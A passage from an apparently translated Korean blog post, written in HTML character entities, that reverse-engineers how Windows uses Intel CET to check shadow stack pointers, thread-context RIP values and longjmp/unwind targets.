&#xD65C;&#xC131;&#xD654;&#xD558;&#xBA74; &#xAE30;&#xC874; Windows 8.1&#xC5D0;&#xC11C; CFG&#xC640; &#xD568;&#xAED8; &#xAD6C;&#xD604;&#xB41C; Check Stack Extents&#xB3C4; &#xC554;&#xC2DC;&#xC801;&#xC73C;&#xB85C; &#xD65C;&#xC131;&#xD654;&#xB41C;&#xB2E4;. &#xC774;&#xAC83;&#xC740; KPROCESS&#xC758; <code>ProcessFlags</code> &#xD544;&#xB4DC;&#xC5D0; &#xC788;&#xB294; <code>CheckStackExtents</code> &#xBE44;&#xD2B8;&#xB97C; &#xD1B5;&#xD574; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xB2E4;. &#xC989;, &#xB300;&#xC0C1; SSP&#xAC00; &#xC720;&#xD6A8;&#xC131;&#xC744; &#xAC80;&#xC0AC;&#xD560; &#xB54C;&#xB9C8;&#xB2E4; <a href="https://github.com/yardenshafir/cet-research/blob/master/src/KeVerifyContextRecord.c">KeVerifyContextRecord</a> &#xB610;&#xD55C; &#xD638;&#xCD9C;&#xB418;&#xACE0; &#xB300;&#xC0C1; RSP&#xAC00; &#xD604;&#xC7AC; &#xC2A4;&#xB808;&#xB4DC;&#xC758; TEB &#xC0AC;&#xC6A9;&#xC790; &#xC2A4;&#xD0DD; &#xC81C;&#xD55C; (&#xB610;&#xB294; &#xC774;&#xAC83;&#xC774; WOW64 &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xC778; &#xACBD;&#xC6B0; TEB32&#xC758; &#xC0AC;&#xC6A9;&#xC790; &#xC2A4;&#xD0DD; &#xC81C;&#xD55C;)&#xC758; &#xC77C;&#xBD80;&#xC778;&#xC9C0; &#xD655;&#xC778;&#xD55C;&#xB2E4;. <code>RtlGuardIsValidStackPointer</code> (&#xBC0F; <code>RtlGuardIsValidWow64StackPointer</code>)&#xC5D0; &#xC758;&#xD574; &#xAD6C;&#xD604;&#xB41C; &#xC774;&#xB7EC;&#xD55C; &#xAC80;&#xC0AC;&#xB294; &#xC774;&#xC804;&#xC5D0; <a href="https://medium.com/tenable-techblog/api-series-setthreadcontext-d08c9f84458d">Tenable</a> &#xBC0F; <a href="https://blog.ensilo.com/atombombing-cfg-protected-processes">enSilo</a>&#xC758; &#xC5F0;&#xAD6C;&#xC6D0;&#xC5D0; &#xC758;&#xD574; &#xBB38;&#xC11C;&#xD654;&#xB418;&#xC5C8;&#xB2E4;.</p><h2 id="RIP-Instruction-Pointer-&#xC720;&#xD6A8;&#xC131;-&#xAC80;&#xC0AC;"><a href="#RIP-Instruction-Pointer-&#xC720;&#xD6A8;&#xC131;-&#xAC80;&#xC0AC;" class="headerlink" title="RIP(Instruction Pointer) &#xC720;&#xD6A8;&#xC131; &#xAC80;&#xC0AC;"></a>RIP(Instruction Pointer) &#xC720;&#xD6A8;&#xC131; &#xAC80;&#xC0AC;</h2><p><code>19030</code> &#xBE4C;&#xB4DC; &#xBC84;&#xC804;&#xC5D0; Intel CET&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xB294; &#xB610; &#xB2E4;&#xB978; &#xAE30;&#xB2A5;&#xC778; &#xD638;&#xCD9C;&#xC790;&#xAC00; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xC5D0; &#xB300;&#xD574; &#xC124;&#xC815;&#xD558;&#xB824;&#xB294; &#xC0C8; RIP&#xAC00; &#xC720;&#xD6A8;&#xD55C;&#xC9C0; &#xD655;&#xC778;&#xD558;&#xB294; &#xAE30;&#xB2A5;&#xC774; &#xCD94;&#xAC00;&#xB418;&#xC5C8;&#xB2E4;. SSP &#xC720;&#xD6A8;&#xC131; &#xAC80;&#xC0AC;&#xC640; &#xB9C8;&#xCC2C;&#xAC00;&#xC9C0;&#xB85C; &#xC774;&#xB294; &#xC2A4;&#xB808;&#xB4DC;&#xC5D0; &#xB300;&#xD574; CET&#xC774; &#xD65C;&#xC131;&#xD654;&#xB41C; &#xACBD;&#xC6B0;&#xC5D0;&#xB9CC; &#xC801;&#xC6A9;&#xB41C;&#xB2E4;. &#xADF8;&#xB7EC;&#xB098; RIP &#xC720;&#xD6A8;&#xC131; &#xAC80;&#xC0AC;&#xB294; &#xAE30;&#xBCF8;&#xC801;&#xC73C;&#xB85C; &#xD65C;&#xC131;&#xD654;&#xB418;&#xC5B4; &#xC788;&#xC9C0; &#xC54A;&#xC73C;&#xBA70; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xC5D0; &#xB300;&#xD574; &#xD65C;&#xC131;&#xD654;&#xB418;&#xC5B4;&#xC57C; &#xD55C;&#xB2E4;. (EPROCESS&#xC758; <code>MitigationFlags2Values</code> &#xD544;&#xB4DC;&#xC5D0; &#xC788;&#xB294; <code>UserCetSetContextIpValidation</code> &#xBE44;&#xD2B8;&#xB85C; &#xD45C;&#xC2DC;&#xB428;).</p><p>&#xC989;, &#xD604;&#xC7AC; &#xBE4C;&#xB4DC;&#xC758; &#xACBD;&#xC6B0; <code>CreateProcess</code>&#xB97C; &#xD638;&#xCD9C;&#xD558;&#xACE0; <code>PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY</code> &#xC18D;&#xC131;&#xC744; &#xC0AC;&#xC6A9;&#xD560; &#xB54C; <code>PROCESS_CREATION_MITIGATION_POLICY2_CET_USER_SHADOW_STACKS_ALWAYS_ON</code> &#xD50C;&#xB798;&#xADF8;&#xAC00; &#xD65C;&#xC131;&#xD654;&#xB418;&#xBA74; &#xC635;&#xC158;&#xC774; &#xC124;&#xC815;&#xB418;&#xB294; &#xAC83;&#xC73C;&#xB85C; &#xBCF4;&#xC778;&#xB2E4;. (CET&#xB294; &#xD504;&#xB85C;&#xC138;&#xC2A4; &#xC0DD;&#xC131; &#xC2DC;&#xC5D0;&#xB9CC; &#xD65C;&#xC131;&#xD654;&#xB420; &#xC218; &#xC788;&#xC73C;&#xBBC0;&#xB85C; <code>ProcessUserShadowStackPolicy</code> &#xAC12;&#xC73C;&#xB85C; <code>SetProcessMitgationPolicy</code> API&#xB97C; &#xD638;&#xCD9C;&#xD558;&#xB294; &#xAC83;&#xC740; &#xC720;&#xD6A8;&#xD558;&#xC9C0; &#xC54A;&#xB2E4;.)</p><p>&#xADF8;&#xB7EC;&#xB098; &#xD765;&#xBBF8;&#xB86D;&#xAC8C;&#xB3C4; &#xC0C8;&#xB85C;&#xC6B4; mitigation &#xC635;&#xC158;&#xC778; <code>PS_MITIGATION_OPTION_USER_CET_SET_CONTEXT_IP_VALIDATION (32)</code> &#xC774; mitigation map&#xC5D0; &#xCD94;&#xAC00;&#xB418;&#xC5C8;&#xB2E4;. &#xBB38;&#xC11C;&#xD654;&#xB418;&#xC9C0; &#xC54A;&#xC740; &#xC774; mitigation&#xC744; &#xD1A0;&#xAE00; &#xD558;&#xBA74; <code>MitigationFlags2Values</code> &#xD544;&#xB4DC;&#xC5D0;&#xC11C; <code>AuditUserCetSetContextIpValidation</code> &#xBE44;&#xD2B8;&#xB97C; &#xD65C;&#xC131;&#xD654;&#xD55C;&#xB2E4;. &#xB610;&#xD55C; &#xC774;&#xAC83;&#xC740; &#xC774;&#xC81C; 32 &#xBC88;&#xC9F8; mitigation &#xC635;&#xC158; (&#xAC01;&#xAC01; DEFERRED / OFF / ON / RESERVED&#xC5D0; &#xB300;&#xD574; 4 &#xBE44;&#xD2B8;&#xB97C; &#xCC28;&#xC9C0;&#xD568;)&#xC774;&#xBBC0;&#xB85C; 132&#xAC1C;&#xC758; mitigation &#xBE44;&#xD2B8;&#xAC00; &#xD544;&#xC694;&#xD558;&#xBA70; <code>PS_MITIGATION_OPTIONS_MAP</code>&#xB294; Map &#xD544;&#xB4DC;&#xC758; 3&#xAC1C;&#xC758; 64 &#xBE44;&#xD2B8; &#xBC30;&#xC5F4; &#xC694;&#xC18C;&#xB85C; &#xD655;&#xC7A5;&#xB418;&#xC5C8;&#xB2E4;.  (<code>PS_SYSTEM_DLL_INIT_BLOCK</code>&#xC758; &#xD06C;&#xAE30;&#xC5D0; &#xB300;&#xD55C; &#xD6C4;&#xC18D; &#xD6A8;&#xACFC;&#xAC00; &#xC788;&#xC74C;)</p><p>&#xC0C8;&#xB85C;&#xC6B4; <a href="https://github.com/yardenshafir/cet-research/blob/master/src/KeVerifyContextIpForUserCet.c">KeVerifyContextIpForUserCet</a> &#xD568;&#xC218;&#xB294; &#xC2A4;&#xB808;&#xB4DC;&#xC758; &#xCF58;&#xD14D;&#xC2A4;&#xD2B8;&#xAC00; &#xBCC0;&#xACBD;&#xB420; &#xB54C;&#xB9C8;&#xB2E4; &#xD638;&#xCD9C;&#xB41C;&#xB2E4;. &#xC2A4;&#xB808;&#xB4DC;&#xC5D0; &#xB300;&#xD574; CET &#xBC0F; RIP mitigation&#xC774; &#xBAA8;&#xB450; &#xD65C;&#xC131;&#xD654;&#xB418;&#xC5B4; &#xC788;&#xB294;&#xC9C0; &#xD655;&#xC778;&#xD558;&#xACE0; &#xCF58;&#xD14D;&#xC2A4;&#xD2B8; &#xB9E4;&#xAC1C; &#xBCC0;&#xC218;&#xC5D0; <code>CONTEXT_CONTROL</code> &#xD50C;&#xB798;&#xADF8;&#xAC00; &#xC124;&#xC815;&#xB418;&#xC5B4; &#xC788;&#xB294;&#xC9C0; &#xD655;&#xC778;&#xD55C;&#xB2E4;. &#xC989;, &#xC774; &#xC0C8; &#xCF58;&#xD14D;&#xC2A4;&#xD2B8;&#xC5D0; &#xC758;&#xD574; RIP&#xAC00; &#xBCC0;&#xACBD;&#xB428;&#xC744; &#xC758;&#xBBF8;&#xD55C;&#xB2E4;. &#xBAA8;&#xB4E0; &#xAC80;&#xC0AC;&#xAC00; &#xD1B5;&#xACFC;&#xB418;&#xBA74; &#xB0B4;&#xBD80; <a href="https://github.com/yardenshafir/cet-research/blob/master/src/KiVerifyContextIpForUserCet.c">KiVerifyContextIpForUserCet</a> &#xD568;&#xC218;&#xB97C; &#xD638;&#xCD9C;&#xD55C;&#xB2E4;. &#xC774; &#xD568;&#xC218;&#xC758; &#xBAA9;&#xC801;&#xC740; &#xB300;&#xC0C1; RIP&#xAC00; &#xC720;&#xD6A8;&#xD55C; &#xAC12;&#xC774;&#xACE0; &#xC775;&#xC2A4;&#xD50C;&#xB85C;&#xC787;&#xC774; &#xC784;&#xC758; &#xCF54;&#xB4DC;&#xB97C; &#xC2E4;&#xD589;&#xD558;&#xB294; &#xB370; &#xC0AC;&#xC6A9;&#xD558;&#xB294; &#xAC12;&#xC774; &#xC544;&#xB2CC;&#xC9C0; &#xD655;&#xC778;&#xD558;&#xB294; &#xAC83;&#xC774;&#xB2E4;.</p><p>&#xBA3C;&#xC800; &#xB300;&#xC0C1; RIP &#xC8FC;&#xC18C;&#xAC00; &#xCEE4;&#xB110; &#xC8FC;&#xC18C;&#xAC00; &#xC544;&#xB2C8;&#xBA70; &#xB9E4;&#xD551;&#xB418;&#xC5B4;&#xC11C;&#xB294; &#xC548; &#xB418;&#xB294; &#xD558;&#xC704; 0x10000 &#xBC14;&#xC774;&#xD2B8;&#xC758; &#xC8FC;&#xC18C;&#xAC00; &#xC544;&#xB2CC;&#xC9C0; &#xD655;&#xC778;&#xD55C;&#xB2E4;. &#xADF8;&#xB7F0; &#xB2E4;&#xC74C; &#xB300;&#xC0C1; RIP&#xAC00; &#xC720;&#xC800; &#xBAA8;&#xB4DC;&#xC758; &#xC774;&#xC804; &#xC8FC;&#xC18C;&#xC778; &#xACBD;&#xC6B0;&#xB97C; &#xD5C8;&#xC6A9;&#xD558;&#xAE30; &#xC704;&#xD574;&#xC11C; &#xD574;&#xB2F9; &#xAE30;&#xBCF8; &#xD2B8;&#xB7A9; &#xD504;&#xB808;&#xC784;&#xC744; &#xAC80;&#xC0C9;&#xD558;&#xACE0; &#xB300;&#xC0C1; RIP&#xAC00; &#xD574;&#xB2F9; &#xD2B8;&#xB7A9; &#xD504;&#xB808;&#xC784;&#xC758; RIP&#xC778;&#xC9C0; &#xD655;&#xC778;&#xD55C;&#xB2E4;. &#xC77C;&#xBC18;&#xC801;&#xC73C;&#xB85C; &#xC2A4;&#xB808;&#xB4DC;&#xC5D0; &#xB300;&#xD574; <code>NtSetThreadContext</code>&#xAC00; &#xCC98;&#xC74C; &#xD638;&#xCD9C;&#xB418;&#xACE0; RIP&#xAC00; &#xC2A4;&#xB808;&#xB4DC;&#xC758; &#xCD08;&#xAE30; &#xC2DC;&#xC791; &#xC8FC;&#xC18C;&#xB85C; &#xC124;&#xC815;&#xB420; &#xB54C; &#xBC1C;&#xC0DD;&#xD558;&#xC9C0;&#xB9CC; &#xC77C;&#xBC18;&#xC801;&#xC774;&#xC9C0; &#xC54A;&#xC740; &#xB2E4;&#xB978; &#xACBD;&#xC6B0;&#xC5D0;&#xB3C4; &#xBC1C;&#xC0DD;&#xD560; &#xC218; &#xC788;&#xB2E4;.</p><p>&#xC774; &#xD568;&#xC218;&#xB294; <code>KCONTINUE_TYPE</code>&#xC744; &#xC218;&#xC2E0;&#xD558;&#xACE0; &#xD574;&#xB2F9; &#xAC12;&#xC5D0; &#xB530;&#xB77C; &#xB2E4;&#xC591;&#xD55C; &#xBC29;&#xC2DD;&#xC73C;&#xB85C; &#xB300;&#xC0C1; RIP&#xB97C; &#xCC98;&#xB9AC;&#xD55C;&#xB2E4;. &#xB300;&#xBD80;&#xBD84;&#xC758; &#xACBD;&#xC6B0; &#xC100;&#xB3C4;&#xC6B0; &#xC2A4;&#xD0DD;&#xC744; &#xBC18;&#xBCF5;&#xD558;&#xACE0; &#xB300;&#xC0C1; RIP&#xB97C; &#xAC80;&#xC0C9;&#xD558;&#xB294;&#xB370;, &#xCC3E;&#xC9C0; &#xBABB;&#xD558;&#xBA74; &#xC608;&#xC678;&#xAC00; &#xBC1C;&#xC0DD;&#xD558;&#xBA70; &#xC608;&#xC678; &#xD578;&#xB4E4;&#xB7EC;&#xC5D0; &#xB3C4;&#xB2EC;&#xD560; &#xB54C;&#xAE4C;&#xC9C0; &#xACC4;&#xC18D; &#xC2E4;&#xD589;&#xB41C;&#xB2E4;. &#xC608;&#xC678; &#xD578;&#xB4E4;&#xB7EC;&#xB294; &#xC81C;&#xACF5;&#xB41C; <code>KCONTINUE_TYPE</code>&#xC774; <code>KCONTINUE_UNWIND</code>&#xC778;&#xC9C0; &#xD655;&#xC778;&#xD558;&#xACE0; <code>KCONTINUE_UNWIND</code> &#xD50C;&#xB798;&#xADF8;&#xC640; &#xD568;&#xAED8; <a href="https://github.com/yardenshafir/cet-research/blob/master/src/RtlVerifyUserUnwindTarget.c">RtlVerifyUserUnwindTarget</a>&#xC744; &#xD638;&#xCD9C;&#xD558;&#xB294;&#xC9C0; &#xD655;&#xC778;&#xD55C;&#xB2E4;. &#xC774; &#xAE30;&#xB2A5;&#xC740; &#xB2E4;&#xC74C; &#xC139;&#xC158;&#xC5D0;&#xC11C; &#xC124;&#xBA85;&#xD558;&#xB294; &#xB354; &#xBCF5;&#xC7A1;&#xD55C; &#xAC80;&#xC0AC;&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xC5EC; RIP&#xB97C; &#xB2E4;&#xC2DC; &#xD655;&#xC778;&#xD55C;&#xB2E4;.</p><p>&#xB2E4;&#xB978; &#xACBD;&#xC6B0;&#xC5D0;&#xB294; <code>STATUS_SET_CONTEXT_DENIED</code>&#xB97C; &#xBC18;&#xD658;&#xD558;&#xC5EC; EPROCESS&#xC5D0; <code>AuditUserCetSetContextIpValidation</code> &#xD50C;&#xB798;&#xADF8;&#xAC00; &#xC124;&#xC815;&#xB41C; &#xACBD;&#xC6B0; &#xC2E4;&#xD328; &#xAC80;&#xC0AC;&#xB97C; &#xC704;&#xD574; <a href="https://github.com/yardenshafir/cet-research/blob/master/src/KeVerifyContextIpForUserCet.c">KeVerifyContextIpForUserCet</a>&#xC774; <code>KiLogUserCetSetContextIpValidationAudit</code>&#xD568;&#xC218;&#xB97C; &#xD638;&#xCD9C;&#xD55C;&#xB2E4;. &#xC774; &#xAC80;&#xC0AC;(auditing)&#xB294; &#xC77C;&#xBC18;&#xC801;&#xC778; &#xD504;&#xB85C;&#xC138;&#xC2A4; mitigation ETW &#xCC44;&#xB110;&#xC744; &#xD1B5;&#xD574; &#xC218;&#xD589;&#xB418;&#xB294; &#xB300;&#xC2E0; WER (Windows &#xC624;&#xB958;&#xBCF4;&#xACE0;) &#xC11C;&#xBE44;&#xC2A4;&#xB97C; &#xD1B5;&#xD574; &#xBE60;&#xB978; &#xC2E4;&#xD328; &#xC608;&#xC678;&#xB97C; &#xC9C1;&#xC811; &#xBC1C;&#xC0DD;&#xC2DC;&#xD0A4;&#xB294; &#xBC29;&#xC2DD;&#xC73C;&#xB85C; &#xC218;&#xD589;&#xB41C;&#xB2E4;. (<code>FAST_FAIL_SET_CONTEXT_DENIED</code>&#xB85C; &#xC124;&#xC815;&#xB41C; &#xC815;&#xBCF4;&#xB85C; <code>0xC000409</code> &#xC608;&#xC678;&#xB97C; &#xC804;&#xC1A1;). WER &#xC2A4;&#xD338;&#xC744; &#xBC29;&#xC9C0;&#xD558;&#xAE30; &#xC704;&#xD574; <code>AuditUserCetSetContextIpValidationLogged</code>&#xB77C;&#xB294; &#xB610; &#xB2E4;&#xB978; EPROCESS &#xBE44;&#xD2B8;&#xAC00; &#xC0AC;&#xC6A9;&#xB41C;&#xB2E4;.</p><p>&#xC2A4;&#xB808;&#xB4DC;&#xAC00; &#xC885;&#xB8CC;&#xB418;&#xACE0; &#xD604;&#xC7AC; &#xC100;&#xB3C4;&#xC6B0; &#xC2A4;&#xD0DD; &#xC8FC;&#xC18C;&#xAC00; &#xD398;&#xC774;&#xC9C0;&#xB85C; &#xC815;&#xB82C;&#xB41C; &#xACBD;&#xC6B0; &#xD568;&#xC218;&#xAC00; &#xB300;&#xC0C1; RIP&#xB97C; &#xCC3E;&#xAE30; &#xC804;&#xC5D0; &#xC100;&#xB3C4;&#xC6B0; &#xC2A4;&#xD0DD;&#xC5D0; &#xB300;&#xD55C; &#xB8E8;&#xD504;&#xB97C; &#xC911;&#xC9C0;&#xD558;&#xB294; &#xACBD;&#xC6B0;&#xAC00; &#xC788;&#xB2E4;. &#xC989;, &#xC2A4;&#xB808;&#xB4DC;&#xB97C; &#xC885;&#xB8CC;&#xD560; &#xB54C; &#xD568;&#xC218;&#xB294; &#xCD5C;&#xC6B0;&#xC120;&#xC801;&#xC73C;&#xB85C; &#xC100;&#xB3C4;&#xC6B0; &#xC2A4;&#xD0DD;&#xC758; &#xD604;&#xC7AC; &#xD398;&#xC774;&#xC9C0;&#xC5D0;&#xC11C;&#xB9CC; &#xB300;&#xC0C1; RIP&#xB97C; &#xD655;&#xC778;&#xD55C;&#xB2E4;. &#xD574;&#xB2F9; &#xD398;&#xC774;&#xC9C0;&#xC5D0;&#xC11C; &#xB300;&#xC0C1; RIP&#xB97C; &#xCC3E;&#xC9C0; &#xBABB;&#xD558;&#xBA74; <code>STATUS_THREAD_IS_TERMINATING</code>&#xC744; &#xBC18;&#xD658;&#xD55C;&#xB2E4;.</p><p>&#xD568;&#xC218;&#xB294; <code>KCONTINUE_TYPE</code> &#xC774; <code>KCONTINUE_LONGJUMP</code> &#xC778; &#xACBD;&#xC6B0; &#xB300;&#xC0C1; RIP&#xAC00; &#xC100;&#xB3C4;&#xC6B0; &#xC2A4;&#xD0DD;&#xC5D0; &#xB300;&#xD574; &#xAC80;&#xC99D;&#xB418;&#xC9C0; &#xC54A;&#xC9C0;&#xB9CC; &#xB300;&#xC2E0; <a href="https://github.com/yardenshafir/cet-research/blob/master/src/RtlVerifyUserUnwindTarget.c">RtlVerifyUserUnwindTarget</a>&#xC774; <code>KCONTINUE_LONGJUMP</code> &#xD50C;&#xB798;&#xADF8;&#xC640; &#xD568;&#xAED8; &#xD638;&#xCD9C;&#xB418;&#xC5B4; PE Image Load Configuration Directory&#xC758; <code>longjmp</code> &#xD14C;&#xC774;&#xBE14;&#xC5D0;&#xC11C; RIP&#xB97C; &#xD655;&#xC778;&#xD55C;&#xB2E4;. &#xC774; &#xAE00;&#xC758; &#xB2E4;&#xC74C; &#xC139;&#xC158;&#xC5D0;&#xC11C; &#xC774; &#xD45C;&#xC640; &#xAC80;&#xC0AC;&#xC5D0; &#xB300;&#xD574; &#xC124;&#xBA85;&#xD55C;&#xB2E4;.</p><p><img src="/2021/01/17/l0ch/cet-on-windows/6.png" alt></p><p><a href="https://github.com/yardenshafir/cet-research/blob/master/src/KeVerifyContextIpForUserCet.c">KeVerifyContextIpForUserCet</a>&#xC740; &#xB2E4;&#xC74C; &#xB450; &#xD568;&#xC218; &#xC911; &#xD558;&#xB098;&#xC5D0; &#xC758;&#xD574; &#xD638;&#xCD9C;&#xB41C;&#xB2E4;.</p><ul><li><code>PspGetSetContextInternal</code> &#x2013; <code>NtSetContextThread API</code>&#xC5D0; &#xB300;&#xD55C; &#xC751;&#xB2F5;&#xC73C;&#xB85C; &#xD638;&#xCD9C;&#xB41C;&#xB2E4;</li><li><a href="https://github.com/yardenshafir/cet-research/blob/master/src/KiVerifyContextRecord.c">KiVerifyContextRecord</a> &#x2013; <code>NtContinueEx</code>, <code>NtRaiseException</code> &#xBC0F; &#xC77C;&#xBD80; &#xACBD;&#xC6B0; <code>NtSetContextThread</code> API&#xC5D0; &#xB300;&#xD55C; &#xC751;&#xB2F5;&#xC73C;&#xB85C; &#xD638;&#xCD9C;&#xB41C;&#xB2E4;. <a href="https://github.com/yardenshafir/cet-research/blob/master/src/KeVerifyContextIpForUserCet.c">KeVerifyContextIpForUserCet</a>&#xC744; &#xD638;&#xCD9C;&#xD558;&#xAE30; &#xC804;&#xC5D0; (&#xC218;&#xC2E0;&#xB41C; <code>ContinueArgument</code>&#xAC00; NULL&#xC774; &#xC544;&#xB2CC; &#xACBD;&#xC6B0;&#xC5D0;&#xB9CC;)&#xC774; &#xD568;&#xC218;&#xB294; &#xD638;&#xCD9C;&#xC790;&#xAC00; CS &#xB808;&#xC9C0;&#xC2A4;&#xD130;&#xB97C; &#xC218;&#xC815;&#xD558;&#xB824;&#xACE0; &#xD558;&#xB294;&#xC9C0;, &#xC0C8; &#xAC12;&#xC774; &#xC720;&#xD6A8;&#xD55C; &#xAC12;&#xC778;&#xC9C0;&#xB97C; &#xD655;&#xC778;&#xD55C;&#xB2E4;. WOW64&#xAC00; &#xC544;&#xB2CC; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xB294; &#xD53C;&#xCF54; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xC774;&#xBA70;, &#xC774; &#xACBD;&#xC6B0; CS&#xB97C; <code>KGDT64_R3_CODE</code> &#xB610;&#xB294; <code>KGDT64_R3_CMCODE</code>&#xB85C; &#xC124;&#xC815;&#xD560; &#xC218; &#xC788;&#xB2E4;. &#xB2E4;&#xB978; &#xAC12;&#xC740; <a href="https://github.com/yardenshafir/cet-research/blob/master/src/KiVerifyContextRecord.c">KiVerifyContextRecord</a>&#xAC00; &#xC0C8; CS &#xAC12;&#xC744; <code>KGDT64_R3_CODE</code>&#xB85C; &#xAC15;&#xC81C;&#xD55C;&#xB2E4;. <code>KiVerifyContextRecord</code>&#xB294; <code>KiContinuePreviousModeUser</code> &#xB610;&#xB294; <code>KeVerifyContextRecord</code>&#xC5D0; &#xC758;&#xD574; &#xD638;&#xCD9C;&#xB418;&#xBA70; &#xB450; &#xBC88;&#xC9F8;&#xC758; &#xACBD;&#xC6B0;, &#xD568;&#xC218;&#xB294; RSP&#xAC00; &#xD504;&#xB85C;&#xC138;&#xC2A4; &#xC2A4;&#xD0DD; (native &#xB610;&#xB294; wow64) &#xC911; &#xD558;&#xB098;&#xC5D0; &#xC788;&#xACE0; 64 &#xBE44;&#xD2B8; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xAC00; CS&#xB97C; <code>KGDT64_R3_CODE</code>&#xB85C;&#xB9CC; &#xC124;&#xC815;&#xD558;&#xB294;&#xC9C0; &#xD655;&#xC778;&#xD55C;&#xB2E4;.</li></ul><p><code>KeVerifyContextIpForUserCet</code>&#xC744; &#xD638;&#xCD9C;&#xD558;&#xC5EC; &#xB300;&#xC0C1; RIP&#xC758; &#xC720;&#xD6A8;&#xC131;&#xC744; &#xAC80;&#xC0AC;&#xD558;&#xB294; &#xBAA8;&#xB4E0; &#xACBD;&#xB85C;&#xB294; &#xBA3C;&#xC800; <code>KeVerifyContextXStateCetU</code>&#xB97C; &#xD638;&#xCD9C;&#xD558;&#xC5EC; &#xB300;&#xC0C1; SSP&#xC758; &#xC720;&#xD6A8;&#xC131;&#xC744; &#xAC80;&#xC0AC;&#xD558;&#xACE0; SSP&#xAC00; &#xC720;&#xD6A8;&#xD560; &#xB54C;&#xB9CC; RIP &#xAC80;&#xC0AC;&#xB97C; &#xC218;&#xD589;&#xD55C;&#xB2E4;.</p><p><img src="/2021/01/17/l0ch/cet-on-windows/7.png" alt></p><h1 id="&#xC608;&#xC678;-&#xD574;&#xC81C;-&#xBC0F;-longjmp-&#xC720;&#xD6A8;&#xC131;-&#xAC80;&#xC0AC;"><a href="#&#xC608;&#xC678;-&#xD574;&#xC81C;-&#xBC0F;-longjmp-&#xC720;&#xD6A8;&#xC131;-&#xAC80;&#xC0AC;" class="headerlink" title="&#xC608;&#xC678; &#xD574;&#xC81C; &#xBC0F; longjmp &#xC720;&#xD6A8;&#xC131; &#xAC80;&#xC0AC;"></a>&#xC608;&#xC678; &#xD574;&#xC81C; &#xBC0F; longjmp &#xC720;&#xD6A8;&#xC131; &#xAC80;&#xC0AC;</h1><p>&#xC704;&#xC5D0;&#xC11C; &#xC124;&#xBA85;&#xD55C; &#xB300;&#xB85C; <code>KCONTEXT_SET</code> &#xBC0F; <code>KCONTEXT_RESUME</code>&#xC5D0; &#xB300;&#xD55C; &#xCC98;&#xB9AC;&#xB294; &#xB300;&#xC0C1; RIP&#xAC00; &#xC100;&#xB3C4;&#xC6B0; &#xC2A4;&#xD0DD;&#xC758; &#xC77C;&#xBD80;&#xC778;&#xC9C0; &#xD655;&#xC778;&#xD558;&#xB294; &#xAC83;&#xACFC; &#xAD00;&#xB828;&#xC774; &#xC788;&#xC9C0;&#xB9CC; <code>KCONTEXT_UNWIND</code> &#xBC0F; <code>KCONTEXT_LONGJMP</code> &#xACBD;&#xC6B0;&#xC5D0;&#xB294; <code>RtlVerifyUserUnwindTarget</code>&#xC744; &#xD1B5;&#xD55C; &#xD655;&#xC7A5;&#xB41C; &#xC720;&#xD6A8;&#xC131; &#xAC80;&#xC0AC;&#xAC00; &#xD544;&#xC694;&#xD558;&#xB2E4;. &#xC774; &#xB450; &#xBC88;&#xC9F8; &#xC720;&#xD6A8;&#xC131; &#xAC80;&#xC0AC;&#xB97C; &#xC704;&#xD574;&#xC11C;&#xB294; PE &#xD30C;&#xC77C; &#xD615;&#xC2DD; (&#xBC0F; &#xCEF4;&#xD30C;&#xC77C;&#xB7EC; &#xC9C0;&#xC6D0;)&#xC744; &#xBCC0;&#xACBD;&#xD574;&#xC57C; &#xD558;&#xBA70; JIT &#xCEF4;&#xD30C;&#xC77C;&#xB7EC; &#xC9C0;&#xC6D0;&#xC744; &#xC704;&#xD574; <a href="https://github.com/yardenshafir/cet-research/blob/master/src/NtSetInformationProcess.c">NtSetInformationProcess</a>&#xC5D0; &#xCD94;&#xAC00;&#xB41C; &#xC0C8;&#xB85C;&#xC6B4; OS &#xC218;&#xC900;&#xC758; &#xC815;&#xBCF4; &#xD074;&#xB798;&#xC2A4;&#xAC00; &#xD3EC;&#xD568;&#xB418;&#xC5B4; &#xC788;&#xB2E4;.</p><p>CFG (Control Flow Guard) &#xC9C0;&#xC6D0;&#xC73C;&#xB85C; &#xC778;&#xD574; &#xC774;&#xBBF8; &#xCD94;&#xAC00;&#xB41C; PE &#xD30C;&#xC77C; &#xB0B4;&#xBD80;&#xC758; <code>Image Load Configuration Directory</code>&#xC5D0;&#xB294; &#xD604;&#xC7AC; &#xC124;&#xC815;&#xB41C; <code>jmp/longjmp</code> &#xC30D;&#xC758; &#xC77C;&#xBD80;&#xB85C; &#xC0AC;&#xC6A9;&#xB418;&#xB294; &#xBD84;&#xAE30; &#xC720;&#xD6A8; &#xB300;&#xC0C1;&#xC5D0; &#xB300;&#xD55C; &#xC815;&#xBCF4;&#xAC00; &#xD3EC;&#xD568;&#xB418;&#xC5B4; &#xC788;&#xC73C;&#xBA70;, &#xC774; &#xC815;&#xBCF4;&#xB97C; &#xCEF4;&#xD30C;&#xC77C;&#xB7EC;&#xAC00; &#xC2DD;&#xBCC4;&#xD574; &#xB9C1;&#xCEE4;&#xC5D0; &#xC804;&#xB2EC;&#xD558;&#xB3C4;&#xB85D; &#xB418;&#xC5B4; &#xC788;&#xB2E4;. CET&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xBA74; &#xC774; &#xAE30;&#xC874; &#xB370;&#xC774;&#xD130;&#xAC00; &#xC7AC;&#xC0AC;&#xC6A9;&#xB418;&#xC9C0;&#xB9CC; &#xC5F0;&#xC18D; &#xC608;&#xC678; &#xD578;&#xB4E4;&#xB7EC; &#xC9C0;&#xC6D0;&#xC744; &#xC704;&#xD574; &#xB610; &#xB2E4;&#xB978; &#xD14C;&#xC774;&#xBE14;&#xACFC; &#xD06C;&#xAE30;&#xAC00; &#xCD94;&#xAC00;&#xB41C;&#xB2E4;. Visual Studio 2017&#xC740; <code>longjmp</code> &#xD14C;&#xC774;&#xBE14;&#xC744; &#xC0DD;&#xC131;&#xD558;&#xC9C0;&#xB9CC; Visual Studio 2019&#xBD80;&#xD130; &#xC704;&#xC640; &#xAC19;&#xC740; &#xC815;&#xBCF4;&#xAC00; &#xD3EC;&#xD568;&#xB41C; 